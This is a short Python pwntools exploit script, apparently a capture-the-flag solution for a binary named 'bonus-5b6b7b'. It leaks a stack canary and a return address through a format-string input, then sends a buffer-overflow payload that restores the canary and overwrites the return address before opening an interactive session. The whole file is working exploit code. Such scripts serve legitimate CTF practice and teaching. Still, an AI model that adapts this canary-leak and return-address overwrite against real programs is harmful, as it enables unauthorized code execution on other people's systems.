#!/usr/bin/python3
from pwn import *
import binascii

# p = remote("holopwn.sister20.tech", 14045)
p = process(b'./bonus-5b6b7b')

# NIM:
# p.recvuntil(b': ')

# p.sendline(b"13521092;9cd67ffd")

# Enter your name:
p.recvuntil(b':')

p.sendline(b'%67$p %71$p')

# Your name is:
p.recvuntil(b'your name is:\n')
output = p.recvuntil(b'\n')
hexval = output[2:10]
hexval = int(hexval, 16)
# print(p32(hexval))

# Enter your message:
p.recvuntil(b':')

print(output)
main_return = int(output[13:21],16)
# print(p32(main_return))

selisih = 439

main_return -= selisih

payload = b'A' * 252 + p32(hexval) + b'B' * 12 + p32(main_return)
print(payload)

p.sendline(payload)

log.info(p.clean())
p.interactive()